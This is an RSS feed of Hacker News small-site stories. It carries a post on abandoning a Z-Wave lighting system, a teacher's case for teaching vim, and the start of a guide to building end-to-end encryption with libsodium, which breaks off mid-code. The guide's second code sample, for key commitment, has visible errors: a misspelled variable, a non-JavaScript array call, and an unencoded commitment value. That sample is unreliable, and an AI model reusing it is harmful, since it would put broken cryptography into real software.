<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 10]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 10. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Mon, 16 Nov 2020 16:36:12 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-10.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Mon, 16 Nov 2020 16:36:12 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[The Reasons I Ripped Out a £6k Lighting System]]>
            </title>
            <description>
<![CDATA[
Score 62 | Comments 58 (<a href="https://news.ycombinator.com/item?id=25099615">thread link</a>) | @iamflimflam1
<br/>
November 15, 2020 | https://robdobson.com/2020/11/the-10-reasons-i-ripped-out-a-6k-lighting-system/ | <a href="https://web.archive.org/web/*/https://robdobson.com/2020/11/the-10-reasons-i-ripped-out-a-6k-lighting-system/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


  <p>Back in 2012 my wife and I started a house renovation project in Edinburgh (Scotland) having moved to that great city the previous year. In our previous London abode we’d installed a wireless lighting system from a company called Rako and it worked well enough to convince us that wireless was the way to go. Now, having installed and maintained a system with over 150 wireless lighting control circuits over the past 7 years I’ve finally had to admit that my technology choice was wrong. The Z-Wave wireless lighting system I installed just doesn’t work for a home like mine. I have now ripped out almost all of the Z-Wave units I installed – which had cost me more than £6k to buy and install. Read on to see the 10 reasons I finally kicked it out and what I have now replaced it with.</p>
<h2>My career in Wireless</h2>
<p><img loading="lazy" src="https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/Actixlogohires-300x224.jpg" alt="" width="205" height="153" srcset="https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/Actixlogohires-300x224.jpg 300w, https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/Actixlogohires-100x75.jpg 100w, https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/Actixlogohires.jpg 500w" sizes="(max-width: 205px) 100vw, 205px">Firstly let me explain that I spent most of my career in the wireless (mobile phone) industry and consider myself to have a reasonable degree of expertise in the field. The company I founded (<a href="http://www.actix.com/">http://www.actix.com</a>) has been a leading specialist in planning and optimising new wireless technologies for the past 25 years and has developed solutions for measurement and optimisation of everything from Analog to 5G.</p>
<p>Wireless technology is behind some of the most amazing developments of the last 50 years – things like the iPhone and satellite TV. So you may find it strange that I would be doubting the ability of a leading home-automation wireless technology to do something as straightforward as turning a light on and off. But unfortunately my experience has been exactly that.&nbsp;</p>
<h2>Z-Wave – The system I chose in 2012</h2>
<p>Back in 2012 I asked for recommendations from the people I knew who were Home Automation pioneers – not least <a href="https://www.devicepilot.com/about">Pilgrim Beart</a> (the founder of the Hive product <a href="https://www.hivehome.com/">https://www.hivehome.com</a> now owned by BG) and <a href="https://en.wikipedia.org/wiki/Quentin_Stafford-Fraser">Quentin Stafford-Fraser</a> (co-inventor of the webcam). The consensus around the time was that one of the wireless technologies already on the market would become the de-facto standard for domestic lighting control. That seemed pretty compelling as companies like <a href="https://aeotec.com/">AeoTech,</a>&nbsp;<a href="https://www.fibaro.com/en/">Fibaro</a>, Philips and LightwaveRF were already producing wireless lighting systems including (in the first two instances) control modules that could be retro-fitted into the pattress (wall-box) behind a light switch.</p>
<p><img loading="lazy" src="https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/Screenshot-2020-11-14-190552.png" alt="" width="172" height="145" srcset="https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/Screenshot-2020-11-14-190552.png 172w, https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/Screenshot-2020-11-14-190552-100x84.png 100w" sizes="(max-width: 172px) 100vw, 172px"><img loading="lazy" src="https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/Screenshot-2020-11-14-190703-300x210.png" alt="" width="231" height="162" srcset="https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/Screenshot-2020-11-14-190703-300x210.png 300w, https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/Screenshot-2020-11-14-190703-100x70.png 100w, https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/Screenshot-2020-11-14-190703.png 753w" sizes="(max-width: 231px) 100vw, 231px"></p>
<p>At that time there were essentially three main choices of wireless technology: <a href="https://www.z-wave.com/">Z-Wave</a>, <a href="https://lightwaverf.com/">LightwaveRF</a> and <a href="https://zigbeealliance.org/">ZigBee</a>. I discounted LightwaveRF as it was (still is?) very range limited and my house is an old one built almost entirely from large stone blocks (even internally) that are very good at blocking RF signals. Between Z-Wave and ZigBee there wasn’t much to choose from a wireless perspective but the decision was made for me when I looked at the manufacturer support for each technology. As mentioned above companies like AeoTech and Fibaro already had modules (devices that turn on/off or dim a circuit) on the market that I thought would be ideal for my lighting control system whereas such support for ZigBee was pretty much completely absent save a few hobbyist-level companies.</p>
<p>So I found a supplier (<a href="https://www.vesternet.com/">Vesternet</a> – who have been great by the way) and started ordering Z-Wave modules to try out. Fast-forward 18 months or so and I’d installed (with the help of a great electrician called Lorenzo) over 150 circuits with Z-Wave control. Many of the modules I installed in that period were Fibaro generation 1 dimmer and switch (relay) units. They had a few quirks but I found that if I bought the right LED lamps (mainly Philips ones) and used the balun that you can buy to compliment a Fibaro dimmer then I could get (relatively) flicker-free dimming wirelessly.</p>
<div id="attachment_1799"><p><img aria-describedby="caption-attachment-1799" loading="lazy" src="https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/20201114_201934-house-300x225.jpg" alt="" width="529" height="397" srcset="https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/20201114_201934-house-300x225.jpg 300w, https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/20201114_201934-house-1024x768.jpg 1024w, https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/20201114_201934-house-768x576.jpg 768w, https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/20201114_201934-house-1536x1152.jpg 1536w, https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/20201114_201934-house-2048x1536.jpg 2048w, https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/20201114_201934-house-100x75.jpg 100w, https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/20201114_201934-house-1184x888.jpg 1184w" sizes="(max-width: 529px) 100vw, 529px"></p><p id="caption-attachment-1799">Lorenzo is the guy on the roof harnessing the lightning. Picture by Rab (Ian or Yanny) Gamble.</p></div>
<p>Since Lorenzo was replacing most of the wiring in the house I managed to get him to bring a lot of the control cables together in around five separate locations. This simplified the task of adding devices and also helped me to keep track of the actual units. To this day I have a spreadsheet with around 500 lines (around 3 lines per circuit) which details all of the lighting circuits in the house, the circuit breaker they are connected to, the type of device that controls the circuit and its location. Unfortunately I wasn’t 100% successful in getting the control point of all the lighting circuits in one of these five locations and there are actually at least three units lost in the walls somewhere which respond to Z-Wave commands but don’t seem to control anything I can find!</p>
<h2>Z-Wave Hubs</h2>
<p>Having chosen a technology and the modules to turn things on and off (or dim them) the next step is to decide on a central hub or controller as all Z-Wave networks need one of those. At the time a popular one was called <a href="https://www.vesternet.com/pages/vera-controller-comparison">Vera</a> and I initially opted for that. It had a reasonably good way of overcoming one of the problems of Z-Wave (adding a new module requires the hub and the module to be close together) which came in the form of a battery box that could power the hub while you moved it around to add modules (the AeoTech Z-Stick has a similar feature). Unfortunately Vera also had a number of downsides – a limited API to allow it to be controlled by other systems, a non-working backup system that forgot what modules had been added and a slow processor which meant adding multiple modules took a stupidly long time.</p>
<p><img loading="lazy" src="https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/FIB_HC2_01-300x78.png" alt="" width="300" height="78" srcset="https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/FIB_HC2_01-300x78.png 300w, https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/FIB_HC2_01-768x201.png 768w, https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/FIB_HC2_01-100x26.png 100w, https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/FIB_HC2_01.png 795w" sizes="(max-width: 300px) 100vw, 300px"><img loading="lazy" src="https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/MCV_VERA_L-300x275.png" alt="" width="221" height="203" srcset="https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/MCV_VERA_L-300x275.png 300w, https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/MCV_VERA_L-100x92.png 100w, https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/MCV_VERA_L.png 496w" sizes="(max-width: 221px) 100vw, 221px"></p>
<p>So began a waltz through a significant part of the available hub-landscape, taking in <a href="https://www.vesternet.com/products/z-wave-fibaro-home-center-2-system">Fibaro’s HC2 hub</a>, a Mac-based home automation app called <a href="https://www.indigodomo.com/">Indigo</a>, an open-source system called <a href="https://www.domoticz.com/">Domoticz</a> and finally <a href="https://www.home-assistant.io/">Home Assistant</a> (recommended by Quentin who I mentioned previously – did I tell you he co-invented the web-cam – I did – but I guess that’s cool enough to be mentioned twice – right?). Each has their own strengths and weaknesses but ultimately a lot of the problems I found with any of these systems came down to issues with Z-Wave itself and while my sashays from one to another sometimes gave me the impression of progress they generally just shifted the shadows around and left the underlying issues unresolved.</p>
<p>What did prove to be significant though was the hardware on which these systems are based. The Vera and Fibaro HC2 have their own hardware platforms which are not open and this gave me quite a bit of trouble as I tried to work though the failure concentration problem that I will attempt to explicate later. The Mac-based system was good in the sense that it was based on Mac hardware which I have found to be relatively reliable. However, it was, ironically, the failure of a Mac Mini which ultimately precipitated another switch that I had been mulling due to a lack of Z-Wave diagnostics.</p>
<p>The systems I moved to (Domoticz and then Home Assistant) were based on Raspberry Pi hardware and that has resulted in quite a few more problems – SD card corruption due to brown-outs, reboots at unfortunate times due to me attempting to automate system updates and hardware failure initiated by some circuit breaker issues I experienced.</p>
<h2>Reason 1: Z-Wave Pairing</h2>
<p>The process of adding a module to a Z-Wave network is to put the hub into “include” mode and then press a button on the module while it is close to the hub. That sounds simple enough but now imagine doing this for 150 modules scattered around a house, some behind wall-plates, others in waterproof boxes, concealed in ceilings, etc.</p>
<p><img loading="lazy" src="https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/z-wave-protocol-hacking-300x157.png" alt="" width="300" height="157" srcset="https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/z-wave-protocol-hacking-300x157.png 300w, https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/z-wave-protocol-hacking-100x52.png 100w, https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/z-wave-protocol-hacking.png 728w" sizes="(max-width: 300px) 100vw, 300px"></p>
<p>It was quite onerous to do it once but I think I’ve probably done it on average three times for every module in the house plus quite a few more times for modules that I’ve moved around, or have failed and had to be replaced. That’s getting on for 500 include processes. And that’s just to get the module visible to the system. Once it is included you generally have to locate the specific function(s) of the module you want to use (e.g. a motion sensor might have a temperature reading, a light-level and an alarm setting in addition to the motion detection function), then you give each function a name, then you need to indicate what room it is in, then you might want to group it with other module functions (so, for instance, a mood setting in the dining room sets the light levels on five different modules via a scene or group). All of that needs to be typed in and you will generally be doing this while wandering around, so you will do it on a laptop or tablet and sometimes up a ladder or in a cupboard.</p>
<p>I have now gotten to the stage where I dread some modules failing. The one that controls a water-feature in the garden is in a sealed box, the one that controls an out-door heater is in a small loft area that can only be accessed by a rickety ladder, the one for the guest-room extractor fan is in a crawl space, etc. This can’t be the right way to do things can it?</p>
<p>When I compare this to the way IT operations used to be compared to the way dev-ops is now I think it is fair to say that we are just at the start and that things must change. It used to be normal that an IT person would have to physically sit at a computer for hour on end to install OSes, applications and security. Now it is done remotely and automatically on predominantly virtualized hardware. Furthermore, most apps are now in the cloud and the management of the servers that run them are automated to the Nth degree. Home automation and IoT have a long way to go!</p>
<h2>Reason 2: Z-Wave Healing After Adding a Module</h2>
<p>As mentioned a common challenge with Z-Wave is that introducing a new module to the network requires the module and hub to be close together. This actually creates a lot of work. There are two main ways to handle this:</p>
<ol>
<li>bring the hub to the module once it is in-situ and operating</li>
<li>power the module up when it is close to the hub and then move it later</li>
</ol>
<p>Both options are problematic if you are relying on the mesh network capabilities to extend the range of the network because the mesh works by finding routes from one module to another so that it can communicate at distance.</p>
<p><img loading="lazy" src="https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/ZWaveNetworkInfo-300x130.jpg" alt="" width="487" height="211" srcset="https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/ZWaveNetworkInfo-300x130.jpg 300w, https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/ZWaveNetworkInfo-100x43.jpg 100w, https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/ZWaveNetworkInfo.jpg 700w" sizes="(max-width: 487px) 100vw, 487px"></p>
<p>In …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://robdobson.com/2020/11/the-10-reasons-i-ripped-out-a-6k-lighting-system/">https://robdobson.com/2020/11/the-10-reasons-i-ripped-out-a-6k-lighting-system/</a></em></p>]]>
            </description>
            <link>https://robdobson.com/2020/11/the-10-reasons-i-ripped-out-a-6k-lighting-system/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25099615</guid>
            <pubDate>Sun, 15 Nov 2020 09:24:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why I teach vim]]>
            </title>
            <description>
<![CDATA[
Score 58 | Comments 68 (<a href="https://news.ycombinator.com/item?id=25097788">thread link</a>) | @amichlin
<br/>
November 14, 2020 | https://blog.ceos.io/2020/11/14/why-i-teach-vim/ | <a href="https://web.archive.org/web/*/https://blog.ceos.io/2020/11/14/why-i-teach-vim/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

	<section id="primary">
		<main id="main">

			
<article id="post-124">

	

	
	<div>
		
<figure><a href="https://xkcd.com/378/"><img data-attachment-id="133" data-permalink="https://blog.ceos.io/real_programmers/" data-orig-file="https://blogceosio.files.wordpress.com/2020/11/real_programmers.png" data-orig-size="740,406" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="real_programmers" data-image-description="" data-medium-file="https://blogceosio.files.wordpress.com/2020/11/real_programmers.png?w=300" data-large-file="https://blogceosio.files.wordpress.com/2020/11/real_programmers.png?w=740" src="https://blogceosio.files.wordpress.com/2020/11/real_programmers.png?w=740" alt="" srcset="https://blogceosio.files.wordpress.com/2020/11/real_programmers.png 740w, https://blogceosio.files.wordpress.com/2020/11/real_programmers.png?w=150 150w, https://blogceosio.files.wordpress.com/2020/11/real_programmers.png?w=300 300w" sizes="(max-width: 740px) 100vw, 740px"></a></figure>



<p>The why of why people use vim has been <a href="https://dev.to/iggredible/why-i-use-vim-2f40">covered fairly extensively</a>, so I thought I would spend a little time explaining why I <em>teach</em> vim to my high school students, even in 2020.</p>



<p>It all began when I was assigned a mixed class of ninth through twelfth grade students in computer science just after the financial collapse on 2008. Well, the financial collapse first brought me to teach Intro to Programming using VB 6.0 and Windows thin clients, which was an experience unto itself (thanks in part to the <a href="https://en.wikipedia.org/wiki/Conficker">Conficker virus</a>). That experience is worth a separate blog post and is a good part of why one of my specialties is teaching computer security.</p>



<p>So here I am with all levels of student, including AP CS A (read: AP CS Java), and obsolete Windows PCs (at least the thin clients were gone). I couldn’t install any software, wanted to teach C, had to teach Java, and had very few options (these were the days before online web based IDEs).</p>



<p>I had experience with the UNIX command line, primarily Sun Workstations, thanks to my wonderful education at <a href="https://www.soe.ucsc.edu/departments/computer-science-and-engineering">UCSC</a>, so that wasn’t an issue. I had played with Linux in the 1990s to a bit of success, but hadn’t touched it for almost a decade. So I found an old Pentium 2 carcass in the the garbage outside my condo complex, installed a hard drive, and tried this new (to me) flavor of Linux called, strangely, <a href="https://ubuntu.com/">Ubuntu</a>.</p>



<p>I quickly realized this machine could have all the students coding at one, discovered the wonder that is <a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">putty.exe</a> (it doesn’t require any installation to run!) to connect the obsolete PCs to the server and soon my students were off and coding.</p>



<p>Why did I teach them vim? I wish I could say I agonized over all the options at the time and decided vim was the best pedagogical solution, but the reality of the situation was that vi was what I used in college because my father taught me vi. You see, I am lucky to have a father who worked in the industry and is even somewhat of a <a href="https://www.bell-labs.com/usr/dmr/www/qed.html">footnote in text editor history</a>. So I taught vi (later vim) because it is what I knew. A running theme in many computer science teacher’s trials by fire… teaching something because it is what they know. I will go as far as to argue that it is more important that the teacher knows the editor, and especially the programming language, rather than assigning any importance to one correct editor or one correct language that all teachers should teach.</p>



<p>Years later, though, I still teach vim and the command line. So here is how I justify my decision, even if only to myself.</p>



<p>It just works. Every time I go to a new school, it takes time to get the software installed necessary to run IDEs. I remember walking into one school in which the AP CS A class was flailing away with Eclipse on Mac OS X because the students needed, and didn’t have, administrator access. I have an amazing tech department at my current job, but even here it took us weeks to figure out how to deploy Visual Studio Code on the student’s MacBook Airs and then we had to figure out how to deploy Python3 and Java. So there’s no confusion, I teach vim along with many IDEs and I fully believe it is my responsibility to teach multiple platforms and multiple IDEs, but the CLI and vim are always my safety net.</p>



<p>My students can program in any number of of languages on a now cloud based CLI Linux machine (thank you <a href="https://www.linode.com/">Linode</a> and <a href="https://www.digitalocean.com/">Digital Ocean</a> – both of whom offer a $5/month plan – just. happy customer!). By using the CLI, I can support literally any type of computer connecting (including iPads, although the lack of a virtual esc key drives me batty as a vim user, and <a href="https://chrome.google.com/webstore/detail/secure-shell-app/pnhechapfaindjhompbnflcldabbghjo?hl=en">ChromeBooks</a>). Students can connect from anywhere in the world and things just work. All of this became infinitely important in the remote and hybrid learning experience of the pandemic. And this is all possible because the students use vim.</p>



<p>I keep track of as many of my students that major in CS and a running theme is they all profusely thank me for teaching them vim and the CLI. Too many colleges start CS1 with an IDE and then throw the CS2 students into the deep end with the CLI. Not everyone is as lucky as I was in regards to having a father well versed in the CLI.</p>



<p>And yes, there are online IDEs these days, but I’ve found those to be full of their own pitfalls, privacy issues, and costs and find doing any advanced work using them to be very difficult if not impossible.</p>



<p>Also, to be clear, both nano and Emacs work quite well in the context of CLI Linux and I don’t make any claim that teachers should use vim over those equally acceptable command line text editors except for one small argument. Most people agree, computer security pretty much requires knowledge of the command line and a text editor. I always tell my students that the one editor they are likely to find already installed on a machine is vim and it is a bad day when you have to install another editor. Maybe just an issue for students interested in ethical penetration testing…</p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article><!-- #post-${ID} -->

	<nav role="navigation" aria-label="Posts">
		<h2>Post navigation</h2>
		
	</nav>
<!-- #comments -->

		</main><!-- #main -->
	</section><!-- #primary -->


	</div></div>]]>
            </description>
            <link>https://blog.ceos.io/2020/11/14/why-i-teach-vim/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25097788</guid>
            <pubDate>Sun, 15 Nov 2020 02:50:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Going Bark: A Furry’s Guide to End-to-End Encryption]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25097177">thread link</a>) | @ciarannolan
<br/>
November 14, 2020 | https://soatok.blog/2020/11/14/going-bark-a-furrys-guide-to-end-to-end-encryption/ | <a href="https://web.archive.org/web/*/https://soatok.blog/2020/11/14/going-bark-a-furrys-guide-to-end-to-end-encryption/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			
<p>Governments are back on their anti-encryption bullshit again.</p>



<p>Between the <a href="https://blog.cryptographyengineering.com/2020/03/06/earn-it-is-an-attack-on-encryption/">U.S. Senate’s “EARN IT” Act</a>, the <a href="https://www.eff.org/deeplinks/2020/10/orders-top-eus-timetable-dismantling-end-end-encryption">E.U.’s slew of anti-encryption proposals</a>, and <a href="https://fee.org/articles/australia-s-unprecedented-encryption-law-is-a-threat-to-global-privacy/">Australia’s new anti-encryption law</a>, it’s become clear that the authoritarians in office view online privacy as a threat to their existence.</p>



<p>Normally, when the governments increase their anti-privacy sabre-rattling, technologists start talking more loudly about Tor, Signal, and other privacy technologies (usually only to be drowned out by paranoid people who think Tor and Signal are government backdoors or something stupid; conspiracy theories ruin everything!).</p>



<p><strong>I’m not going to do that.</strong></p>



<p>Instead, I’m going to show you how to add end-to-end encryption to any communication software you’re developing. (Hopefully, I’ll avoid making <a href="https://soatok.blog/2020/10/28/bizarre-design-choices-in-zooms-end-to-end-encryption/">any bizarre design decisions</a> along the way.)</p>



<p>But first, some important disclaimers:</p>



<ol><li><strong>Yes, you should absolutely do this.</strong> I don’t care how banal your thing is; if you expect people to use it to communicate with each other, you should make it so that you can never decrypt their communications.</li><li>You should absolutely NOT bill the thing you’re developing as an <em>alternative</em> to Signal or WhatsApp.</li><li>The goal of doing this is to increase the amount of end-to-end encryption deployed on the Internet that the service operator cannot decrypt (even if compelled by court order) and make E2EE normalized. The goal is NOT to compete with highly specialized and peer-reviewed privacy technology.</li><li>I am not a lawyer, I’m some furry who works in cryptography. The contents of this blog post is not legal advice, nor is it endorsed by any company or organization. Ask the <a href="https://eff.org/">EFF</a> for legal questions.</li></ol>



<p>The organization of this blog post is as follows: First, I’ll explain <a href="#symmetric-key-encryption">how to encrypt and decrypt data between users</a>, assuming you have a key. Next, I’ll explain <a href="#key-agreement">how to build an authenticated key exchange</a> and <a href="#session-key-management">a ratcheting protocol to determine the keys used in the first step</a>. Afterwards, I’ll explore <a href="#identity-key-management">techniques for binding authentication keys to identities and managing trust</a>. Finally, I’ll discuss <a href="#backdoor-resistance">strategies for making it impractical to ever backdoor your software (and impossible to silently backdoor it)</a>, just to piss <a href="https://en.wikipedia.org/wiki/Five_Eyes">the creeps and tyrants of the world</a> off even more.</p>



<p>You don’t have to implement the full stack of solutions to protect users, but the further you can afford to go, the safer your users will be from privacy-invasive policing.</p>







<h2 id="preliminaries">Preliminaries</h2>



<h3 id="choosing-a-cryptography-library">Choosing a Cryptography Library</h3>



<p>In the examples contained on this page, I will be using the <a href="https://libsodium.gitbook.io/doc/">Sodium cryptography library</a>. Specifically, my example code will be written with the <a href="https://github.com/paragonie/sodium-plus">Sodium-Plus</a> library for JavaScript, since it strikes a good balance between performance and being cross-platform.</p>



<pre><code>const { SodiumPlus } = require('sodium-plus');

(async function() {
     // Select a backend automatically
     const sodium = await SodiumPlus.auto();
     
     // Do other stuff here
})();</code></pre>



<p>Libsodium is <a href="https://latacora.micro.blog/2018/04/03/cryptographic-right-answers.html">generally the correct choice for developing cryptography features in software</a>, and is available in most programming languages,</p>



<p>If you’re prone to choose a different library, you should consult your cryptographer (and yes, you should have one on your payroll if you’re doing things different) about your design choices.</p>



<h3>Threat Modelling</h3>



<p>Remember above when I said, “You don’t have to implement the full stack of solutions to protect users, but the further you can afford to go, the safer your users will be from privacy-invasive policing”?</p>



<p>How far you go in implementing the steps outlined on this blog post should be informed by <a href="https://adamcaudill.com/2016/07/20/threat-modeling-for-applications/">a threat model</a>, not an ad hoc judgment.</p>



<p>For example, if you’re encrypting user data and storing it in the cloud, you probably want to pass <a href="https://blog.cryptographyengineering.com/2012/04/05/icloud-who-holds-key/">the Mud Puddle Test</a>:</p>



<blockquote><div><p>1. First, drop your device(s) in a mud puddle.<br>2. Next, slip in said puddle and crack yourself on the head. When you regain consciousness you’ll be perfectly fine, but<em>&nbsp;won’t for the life of you&nbsp;</em>be able to&nbsp;recall your device passwords or keys.<br>3. Now try to get your cloud data back.</p><p>Did you succeed? If so, you’re screwed. Or to be a bit less dramatic, I should say: your cloud provider has access to your ‘encrypted’ data, as does the government if they want it, as does any rogue employee who knows their way around your provider’s internal policy checks.</p></div><cite>Matthew Green describes the Mud Puddle Test, which Apple products <a href="https://sneak.berlin/20201112/your-computer-isnt-yours/">definitely don’t pass</a>.</cite></blockquote>



<p>If you must fail the Mud Puddle Test for your users, make sure you’re clear and transparent about this in the documentation for your product or service.</p>







<h2 id="symmetric-key-encryption">I. Symmetric-Key Encryption</h2>



<p>The easiest piece of this puzzle is to encrypt data in transit between both ends (thus, satisfying the loosest definition of end-to-end encryption).</p>



<p>At this layer, you already have some kind of symmetric key to use for encrypting data before you send it, and for decrypting it as you receive it.</p>



<p>For example, the following code will encrypt/decrypt strings and return hexadecimal strings with a version prefix.</p>


<pre title="">const VERSION = "v1";

/**
 * @param {string|Uint8Array} message
 * @param {Uint8Array} key
 * @param {string|null} assocData
 * @returns {string}
 */
async function encryptData(message, key, assocData = null) {
    const nonce = await sodium.randombytes_buf(24);
    const aad = JSON.stringify({
      'version': VERSION,
      'nonce': await sodium.sodium_bin2hex(nonce),
      'extra': assocData
    });

    const encrypted = await sodium.crypto_aead_xchacha20poly1305_encrypt(
        message,
        nonce,
        key,
        aad
    );
    return (
       VERSION +
       await sodium.sodium_bin2hex(nonce) +
       await sodium.sodium_bin2hex(encrypted)
    );
}

/**
 * @param {string|Uint8Array} message
 * @param {Uint8Array} key
 * @param {string|null} assocData
 * @returns {string}
 */
async function decryptData(encrypted, key, assocData = null) {
    const ver = encrypted.slice(0, 2);
    if (!await sodium.sodium_memcmp(ver, VERSION)) {
        throw new Error("Incorrect version: " + ver);
    }
    const nonce = await sodium.sodium_hex2bin(encrypted.slice(2, 50));
    const ciphertext = await sodium.sodium_hex2bin(encrypted.slice(50));
    const aad = JSON.stringify({
      'version': ver,
      'nonce': encrypted.slice(2, 50),
      'extra': assocData
    });
    
    const plaintext = await sodium.crypto_aead_xchacha20poly1305_decrypt(
        ciphertext,
        nonce,
        key,
        aad
    );
    return plaintext.toString('utf-8');
}
</pre>


<p>Under-the-hood, this is using <a href="https://soatok.blog/2020/07/12/comparison-of-symmetric-encryption-methods/#aes-gcm-vs-xchacha20poly1305">XChaCha20-Poly1305</a>, which is less sensitive to timing leaks than AES-GCM. However, like AES-GCM, this encryption mode doesn’t provide <a href="https://eprint.iacr.org/2019/016">message- or key-commitment</a>.</p>



<p>If you want key commitment, you should derive two keys from <code>$key</code> using a KDF based on hash functions: One for actual encryption, and the other <a href="https://eprint.iacr.org/2020/1153">as a key commitment value</a>.</p>



<p>If you want message commitment, you can use AES-CTR + HMAC-SHA256 or XChaCha20 + BLAKE2b-MAC.</p>



<p>If you want both, ask <a href="https://mumble.net/~campbell/">Taylor Campbell</a> about his BLAKE3-based design.</p>



<p>A modified version of the above code with key-commitment might look like this:</p>


<pre title="">const VERSION = "v2";

/**
 * Derive an encryption key and a commitment hash.
 * @param {CryptographyKey} key
 * @param {Uint8Array} nonce
 * @returns {{encKey: CryptographyKey, commitment: Uint8Array}}
 */
async function deriveKeys(key, nonce) {
    const encKey = new CryptographyKey(await sodium.crypto_generichash(
        new Uint8Array([0x01].append(nonce)),
        key
    ));
    const commitment = await sodium.crypto_generichash(
        new Uint8Array([0x02].append(nonce)),
        key
    );
    return {encKey, commitment};
}

/**
 * @param {string|Uint8Array} message
 * @param {Uint8Array} key
 * @param {string|null} assocData
 * @returns {string}
 */
async function encryptData(message, key, assocData = null) {
    const nonce = await sodium.randombytes_buf(24);
    const aad = JSON.stringify({
      'version': VERSION,
      'nonce': await sodium.sodium_bin2hex(nonce),
      'extra': assocData
    });
    const {encKey, commitment} = await deriveKeys(key, nonce);

    const encrypted = await sodium.crypto_aead_xchacha20poly1305_encrypt(
        message,
        nonce,
        encKey,
        aad
    );
    return (
       VERSION +
       await sodium.sodium_bin2hex(nonce) +
       commitmment +
       await sodium.sodium_bin2hex(encrypted)
    );
}

/**
 * @param {string|Uint8Array} message
 * @param {Uint8Array} key
 * @param {string|null} assocData
 * @returns {string}
 */
async function decryptData(encrypted, key, assocData = null) {
    const ver = encrypted.slice(0, 2);
